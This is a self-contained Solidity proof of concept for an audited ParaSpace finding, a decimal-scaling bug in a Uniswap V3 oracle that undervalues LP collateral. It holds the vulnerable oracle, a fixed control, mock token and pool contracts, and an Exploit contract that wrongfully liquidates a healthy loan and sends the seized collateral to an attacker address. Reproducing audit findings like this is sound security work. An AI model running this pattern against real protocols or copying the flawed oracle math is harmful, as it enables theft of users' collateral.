// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of ParaSpace finding 15979 (H-06):
// "Discrepency in the Uniswap V3 position price calculation because of decimals".
//
// UniswapV3OracleWrapper._getOracleData() synthesizes the oracle-implied
// sqrtPriceX96 that is fed to LiquidityAmounts.getAmountsForLiquidity() to value
// a UniV3 LP position as collateral. In the `token1Decimal > token0Decimal`
// branch it divides by a HARD-CODED `1E9` instead of
// `10**(9 + token1Decimal - token0Decimal)`. For a token0(9dec)/token1(18dec)
// position this over-inflates sqrtPriceX96 by exactly 10^9x.
//
// A verbatim numeric fact (verified against the real integer math, not asserted):
// the 10^9x sqrt-price inflation pushes getAmountsForLiquidity() to value the
// position almost entirely in the *higher-decimal* token (token1, normalized by
// 10^18) instead of the lower-decimal token (token0, normalized by 10^9), so the
// collateral value returned by getTokenPrice() is ~5e8x TOO LOW (a robust
// UNDER-valuation — over-valuation is unreachable in this branch).
//
// Real harm reproduced here: a UniV3 position that legitimately backs a healthy
// 40%-LTV loan is re-priced ~10^9x too low by the buggy oracle, so its loan
// becomes (spuriously) under-collateralized. A liquidator repays the small debt
// and SEIZES the full-value collateral position — a wrongful-liquidation theft.
// Negative control: the recommended fixed divisor prices the collateral
// correctly, the loan stays healthy, and the liquidation reverts.
//
// The vulnerable sqrtPriceX96 arithmetic (SqrtLib.sqrt + the decimal branch) and
// the position-valuation consumer (LiquidityAmounts.getAmountsForLiquidity +
// FullMath.mulDiv + the getTokenPrice formula) are inlined VERBATIM from the
// audited ParaSpace source (code-423n4/2022-11-paraspace). Only the opaque
// external boundaries (ERC20 tokens, a minimal lending pool) are minimal doubles.
// ─────────────────────────────────────────────────────────────────────────────

// ── VERBATIM: paraspace-core/contracts/dependencies/math/SqrtLib.sol ──────────
library SqrtLib {
    function sqrt(uint256 x) internal pure returns (uint256 z) {
        assembly {
            // This segment is to get a reasonable initial estimate for the Babylonian method.
            // If the initial estimate is bad, the number of correct bits increases ~linearly
            // each iteration instead of ~quadratically.
            // The idea is to get z*z*y within a small factor of x.
            // More iterations here gets y in a tighter range. Currently, we will have
            // y in [256, 256*2^16). We ensure y>= 256 so that the relative difference
            // between y and y+1 is small. If x < 256 this is not possible, but those cases
            // are easy enough to verify exhaustively.
            z := 181 // The 'correct' value is 1, but this saves a multiply later
            let y := x
            // Note that we check y>= 2^(k + 8) but shift right by k bits each branch,
            // this is to ensure that if x >= 256, then y >= 256.
            if iszero(lt(y, 0x10000000000000000000000000000000000)) {
                y := shr(128, y)
                z := shl(64, z)
            }
            if iszero(lt(y, 0x1000000000000000000)) {
                y := shr(64, y)
                z := shl(32, z)
            }
            if iszero(lt(y, 0x10000000000)) {
                y := shr(32, y)
                z := shl(16, z)
            }
            if iszero(lt(y, 0x1000000)) {
                y := shr(16, y)
                z := shl(8, z)
            }
            // Now, z*z*y <= x < z*z*(y+1), and y <= 2^(16+8),
            // and either y >= 256, or x < 256.
            // Correctness can be checked exhaustively for x < 256, so we assume y >= 256.
            // Then z*sqrt(y) is within sqrt(257)/sqrt(256) of x, or about 20bps.

            // The estimate sqrt(x) = (181/1024) * (x+1) is off by a factor of ~2.83 both when x=1
            // and when x = 256 or 1/256. In the worst case, this needs seven Babylonian iterations.
            z := shr(18, mul(z, add(y, 65536))) // A multiply is saved from the initial z := 181

            // Run the Babylonian method seven times. This should be enough given initial estimate.
            // Possibly with a quadratic/cubic polynomial above we could get 4-6.
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))
            z := shr(1, add(z, div(x, z)))

            // See https://en.wikipedia.org/wiki/Integer_square_root#Using_only_integer_division.
            // If x+1 is a perfect square, the Babylonian method cycles between
            // floor(sqrt(x)) and ceil(sqrt(x)). This check ensures we return floor.
            // The solmate implementation assigns zRoundDown := div(x, z) first, but
            // since this case is rare, we choose to save gas on the assignment and
            // repeat division in the rare case.
            // If you don't care whether floor or ceil is returned, you can skip this.
            if lt(div(x, z), z) {
                z := div(x, z)
            }
        }
    }
}

// ── VERBATIM: paraspace-core/contracts/dependencies/uniswap/libraries/FixedPoint96.sol ─
library FixedPoint96 {
    uint8 internal constant RESOLUTION = 96;
    uint256 internal constant Q96 = 0x1000000000000000000000000;
}

// ── VERBATIM: paraspace-core/contracts/dependencies/uniswap/libraries/FullMath.sol ─
library FullMath {
    function mulDiv(
        uint256 a,
        uint256 b,
        uint256 denominator
    ) internal pure returns (uint256 result) {
        unchecked {
            uint256 prod0;
            uint256 prod1;
            assembly {
                let mm := mulmod(a, b, not(0))
                prod0 := mul(a, b)
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }

            if (prod1 == 0) {
                require(denominator > 0);
                assembly {
                    result := div(prod0, denominator)
                }
                return result;
            }

            require(denominator > prod1);

            uint256 remainder;
            assembly {
                remainder := mulmod(a, b, denominator)
            }
            assembly {
                prod1 := sub(prod1, gt(remainder, prod0))
                prod0 := sub(prod0, remainder)
            }

            uint256 twos = (0 - denominator) & denominator;
            assembly {
                denominator := div(denominator, twos)
            }

            assembly {
                prod0 := div(prod0, twos)
            }
            assembly {
                twos := add(div(sub(0, twos), twos), 1)
            }
            prod0 |= prod1 * twos;

            uint256 inv = (3 * denominator) ^ 2;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;

            result = prod0 * inv;
            return result;
        }
    }
}

// ── VERBATIM: paraspace-core/contracts/dependencies/uniswap/LiquidityAmounts.sol ─
//    (getAmountsForLiquidity + the two branch helpers + toUint128; the exploit
//     path exercises the in-range split, so both helpers are load-bearing.)
library LiquidityAmounts {
    function toUint128(uint256 x) private pure returns (uint128 y) {
        require((y = uint128(x)) == x);
    }

    function getAmount0ForLiquidity(
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint128 liquidity
    ) internal pure returns (uint256 amount0) {
        unchecked {
            if (sqrtRatioAX96 > sqrtRatioBX96)
                (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

            return
                FullMath.mulDiv(
                    uint256(liquidity) << FixedPoint96.RESOLUTION,
                    sqrtRatioBX96 - sqrtRatioAX96,
                    sqrtRatioBX96
                ) / sqrtRatioAX96;
        }
    }

    function getAmount1ForLiquidity(
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint128 liquidity
    ) internal pure returns (uint256 amount1) {
        if (sqrtRatioAX96 > sqrtRatioBX96)
            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

        unchecked {
            return
                FullMath.mulDiv(
                    liquidity,
                    sqrtRatioBX96 - sqrtRatioAX96,
                    FixedPoint96.Q96
                );
        }
    }

    function getAmountsForLiquidity(
        uint160 sqrtRatioX96,
        uint160 sqrtRatioAX96,
        uint160 sqrtRatioBX96,
        uint128 liquidity
    ) internal pure returns (uint256 amount0, uint256 amount1) {
        if (sqrtRatioAX96 > sqrtRatioBX96)
            (sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);

        if (sqrtRatioX96 <= sqrtRatioAX96) {
            amount0 = getAmount0ForLiquidity(
                sqrtRatioAX96,
                sqrtRatioBX96,
                liquidity
            );
        } else if (sqrtRatioX96 < sqrtRatioBX96) {
            amount0 = getAmount0ForLiquidity(
                sqrtRatioX96,
                sqrtRatioBX96,
                liquidity
            );
            amount1 = getAmount1ForLiquidity(
                sqrtRatioAX96,
                sqrtRatioX96,
                liquidity
            );
        } else {
            amount1 = getAmount1ForLiquidity(
                sqrtRatioAX96,
                sqrtRatioBX96,
                liquidity
            );
        }
    }
}

// ── Position data: the collateral UniV3 position + its oracle inputs. ──────────
//    sqrtRatioAX96 / sqrtRatioBX96 are the tick-boundary sqrt ratios (as would
//    come from TickMath.getSqrtRatioAtTick(tickLower/tickUpper)); token0Price /
//    token1Price are the ParaSpace oracle asset prices; token{0,1}Decimal the
//    ERC20 decimals. These are legitimate position/oracle inputs, not doubles of
//    the vulnerable computation.
struct PositionData {
    uint160 sqrtRatioAX96;
    uint160 sqrtRatioBX96;
    uint128 liquidity;
    uint256 token0Price;
    uint256 token1Price;
    uint8 token0Decimal;
    uint8 token1Decimal;
}

interface IOracle {
    function getTokenPrice(PositionData memory positionData) external view returns (uint256);
    function getSqrtPriceX96(
        uint256 token0Price,
        uint256 token1Price,
        uint8 token0Decimal,
        uint8 token1Decimal
    ) external pure returns (uint160);
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE oracle. getSqrtPriceX96 is the verbatim _getOracleData decimal
// branch; getTokenPrice is the verbatim getTokenPrice valuation (fees omitted:
// the position has no accrued fees — a faithful simplification, not a mock).
// ─────────────────────────────────────────────────────────────────────────────
contract UniswapV3OracleWrapper is IOracle {
    function getSqrtPriceX96(
        uint256 token0Price,
        uint256 token1Price,
        uint8 token0Decimal,
        uint8 token1Decimal
    ) public pure returns (uint160 sqrtPriceX96) {
        if (token1Decimal == token0Decimal) {
            // multiply by 10^18 then divide by 10^9 to preserve price in wei
            sqrtPriceX96 = uint160(
                (SqrtLib.sqrt(((token0Price * (10**18)) / (token1Price))) *
                    2**96) / 1E9
            );
        } else if (token1Decimal > token0Decimal) {
            // multiple by 10^(decimalB - decimalA) to preserve price in wei
            sqrtPriceX96 = uint160(
                (SqrtLib.sqrt(
                    (token0Price *
                        (10**(18 + token1Decimal - token0Decimal))) /
                        (token1Price)
                ) * 2**96) / 1E9 // @> BUG: hard-coded 1E9 ignores the (token1Decimal-token0Decimal) delta; should be 10**(9+token1Decimal-token0Decimal). Inflates sqrtPriceX96 ~10^9x.
            );
        } else {
            // multiple by 10^(decimalA - decimalB) to preserve price in wei then divide by the same number
            sqrtPriceX96 = uint160(
                (SqrtLib.sqrt(
                    (token0Price *
                        (10**(18 + token0Decimal - token1Decimal))) /
                        (token1Price)
                ) * 2**96) / 10**(9 + token0Decimal - token1Decimal)
            );
        }
    }

    function getTokenPrice(PositionData memory positionData) public pure returns (uint256) {
        uint160 sqrtPriceX96 = getSqrtPriceX96(
            positionData.token0Price,
            positionData.token1Price,
            positionData.token0Decimal,
            positionData.token1Decimal
        );

        (uint256 liquidityAmount0, uint256 liquidityAmount1) = LiquidityAmounts
            .getAmountsForLiquidity(
                sqrtPriceX96,
                positionData.sqrtRatioAX96,
                positionData.sqrtRatioBX96,
                positionData.liquidity
            );

        // Verbatim getTokenPrice valuation (fee amounts are zero for this position).
        return
            ((liquidityAmount0 * positionData.token0Price) /
                10**positionData.token0Decimal) +
            ((liquidityAmount1 * positionData.token1Price) /
                10**positionData.token1Decimal);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED oracle (recommended mitigation): the `token1Decimal > token0Decimal`
// branch divides by 10**(9 + token1Decimal - token0Decimal). Everything else
// identical.
// ─────────────────────────────────────────────────────────────────────────────
contract UniswapV3OracleWrapperFixed is IOracle {
    function getSqrtPriceX96(
        uint256 token0Price,
        uint256 token1Price,
        uint8 token0Decimal,
        uint8 token1Decimal
    ) public pure returns (uint160 sqrtPriceX96) {
        if (token1Decimal == token0Decimal) {
            sqrtPriceX96 = uint160(
                (SqrtLib.sqrt(((token0Price * (10**18)) / (token1Price))) *
                    2**96) / 1E9
            );
        } else if (token1Decimal > token0Decimal) {
            sqrtPriceX96 = uint160(
                (SqrtLib.sqrt(
                    (token0Price *
                        (10**(18 + token1Decimal - token0Decimal))) /
                        (token1Price)
                ) * 2**96) / 10**(9 + token1Decimal - token0Decimal) // FIX: scale divisor by the decimal delta
            );
        } else {
            sqrtPriceX96 = uint160(
                (SqrtLib.sqrt(
                    (token0Price *
                        (10**(18 + token0Decimal - token1Decimal))) /
                        (token1Price)
                ) * 2**96) / 10**(9 + token0Decimal - token1Decimal)
            );
        }
    }

    function getTokenPrice(PositionData memory positionData) public pure returns (uint256) {
        uint160 sqrtPriceX96 = getSqrtPriceX96(
            positionData.token0Price,
            positionData.token1Price,
            positionData.token0Decimal,
            positionData.token1Decimal
        );
        (uint256 liquidityAmount0, uint256 liquidityAmount1) = LiquidityAmounts
            .getAmountsForLiquidity(
                sqrtPriceX96,
                positionData.sqrtRatioAX96,
                positionData.sqrtRatioBX96,
                positionData.liquidity
            );
        return
            ((liquidityAmount0 * positionData.token0Price) /
                10**positionData.token0Decimal) +
            ((liquidityAmount1 * positionData.token1Price) /
                10**positionData.token1Decimal);
    }
}

// ── Minimal ERC20 double (opaque token boundary). ─────────────────────────────
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Minimal lending pool double: a UniV3 position is escrowed as collateral, valued
// via the (buggy or fixed) oracle's getTokenPrice, and liquidatable when the
// oracle value * LTV falls below the debt. The vulnerable oracle IS the real
// contract — only the pool wrapper around it is a double.
// ─────────────────────────────────────────────────────────────────────────────
contract LendingPool {
    uint256 public constant LTV_BP = 5000; // 50%

    IOracle public immutable oracle;
    MiniToken public immutable borrowToken;
    MiniToken public immutable collToken;

    struct Loan {
        PositionData pos;
        uint256 collAmount; // physical collateral escrowed (realizable value of the position)
        uint256 debt;       // outstanding borrow
        address borrower;
        bool active;
    }
    mapping(uint256 => Loan) public loans;

    constructor(address _oracle, address _borrowToken, address _collToken) {
        oracle = IOracle(_oracle);
        borrowToken = MiniToken(_borrowToken);
        collToken = MiniToken(_collToken);
    }

    /// @notice Establish a pre-existing loan: escrow the collateral position and
    ///         record the debt disbursed at origination (healthy under correct pricing).
    function originateLoan(
        uint256 id,
        PositionData memory pos,
        uint256 collAmount,
        uint256 debt,
        address borrower
    ) external {
        collToken.transferFrom(msg.sender, address(this), collAmount);
        loans[id] = Loan(pos, collAmount, debt, borrower, true);
    }

    function collateralValue(uint256 id) public view returns (uint256) {
        return oracle.getTokenPrice(loans[id].pos); // consumes the vulnerable oracle
    }

    function isLiquidatable(uint256 id) public view returns (bool) {
        Loan storage l = loans[id];
        return (collateralValue(id) * LTV_BP) / 10000 < l.debt;
    }

    /// @notice Liquidate an under-collateralized loan: repay the debt, seize all collateral.
    function liquidate(uint256 id) external returns (uint256 seized) {
        Loan storage l = loans[id];
        require(l.active, "inactive");
        require(isLiquidatable(id), "healthy");
        borrowToken.transferFrom(msg.sender, address(this), l.debt);
        seized = l.collAmount;
        l.active = false;
        collToken.transfer(msg.sender, seized);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a victim's full-range token0(9dec)/token1(18dec) position backs
// a healthy 40%-LTV loan. The buggy oracle under-values it ~5e8x, so a liquidator
// (this contract) repays the small debt and seizes the full-value collateral,
// forwarding the stolen collateral to the attacker EOA.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant VICTIM = 0x0000000000000000000000000000000000009901;

    // Full-range tick boundaries (TickMath.getSqrtRatioAtTick(MIN_TICK/MAX_TICK)).
    uint160 internal constant MIN_SQRT = 4295128739;
    uint160 internal constant MAX_SQRT = 1461446703485210103287273052203988822378723970342;

    uint256 public constant ID = 1;

    // Exposed results for the driver / Playground.
    address public buggyOracleAddr;
    address public fixedOracleAddr;
    address public poolAddr;
    address public collTokenAddr;
    address public borrowTokenAddr;

    uint160 public buggySqrtPriceX96;
    uint160 public fixedSqrtPriceX96;
    uint256 public correctValue;   // getTokenPrice under fixed oracle (true collateral value)
    uint256 public buggyValue;     // getTokenPrice under buggy oracle (under-valued)
    uint256 public debtRepaid;     // BORROW repaid by the liquidator
    uint256 public seizedColl;     // COLL seized by the attacker
    uint256 public attackerCollBalance;

    function run() external payable {
        // --- deploy tokens + both oracles + a pool wired to the BUGGY oracle ---
        MiniToken borrowT = new MiniToken("Borrow", "BRW");
        MiniToken collT = new MiniToken("Collateral", "COLL");
        UniswapV3OracleWrapper buggy = new UniswapV3OracleWrapper();
        UniswapV3OracleWrapperFixed fixedO = new UniswapV3OracleWrapperFixed();
        LendingPool pool = new LendingPool(address(buggy), address(borrowT), address(collT));

        buggyOracleAddr = address(buggy);
        fixedOracleAddr = address(fixedO);
        poolAddr = address(pool);
        collTokenAddr = address(collT);
        borrowTokenAddr = address(borrowT);

        // --- the victim's collateral: a full-range 9dec/18dec position, equal prices ---
        PositionData memory pos = PositionData({
            sqrtRatioAX96: MIN_SQRT,
            sqrtRatioBX96: MAX_SQRT,
            liquidity: 1e18,
            token0Price: 1e18,
            token1Price: 1e18,
            token0Decimal: 9,
            token1Decimal: 18
        });

        // sqrt-price inflation fact and the resulting valuations.
        buggySqrtPriceX96 = buggy.getSqrtPriceX96(1e18, 1e18, 9, 18);
        fixedSqrtPriceX96 = fixedO.getSqrtPriceX96(1e18, 1e18, 9, 18);
        correctValue = fixedO.getTokenPrice(pos); // true value V_correct
        buggyValue = buggy.getTokenPrice(pos);    // under-valued V_buggy

        // --- originate the victim's healthy loan (debt = 40% of true value, LTV cap 50%) ---
        uint256 collAmount = correctValue;            // escrow COLL == the position's realizable value
        uint256 debt = (correctValue * 4000) / 10000; // healthy under correct pricing
        collT.mint(address(this), collAmount);
        collT.approve(address(pool), collAmount);
        pool.originateLoan(ID, pos, collAmount, debt, VICTIM);

        // --- attacker (this contract) liquidates via the BUGGY oracle ---
        borrowT.mint(address(this), debt);            // liquidator repayment capital
        borrowT.approve(address(pool), debt);
        seizedColl = pool.liquidate(ID);              // seizes the full-value collateral
        debtRepaid = debt;

        // --- forward the stolen collateral to the attacker EOA ---
        collT.transfer(ATTACKER, seizedColl);
        attackerCollBalance = collT.balanceOf(ATTACKER);

        // --- harm: full-value collateral stolen for a fraction of its worth ---
        require(buggyValue * 100_000_000 < correctValue, "not under-valued 1e8x");
        require(seizedColl > debtRepaid, "no theft");
        require(attackerCollBalance == seizedColl, "attacker holds stolen collateral");
    }
}
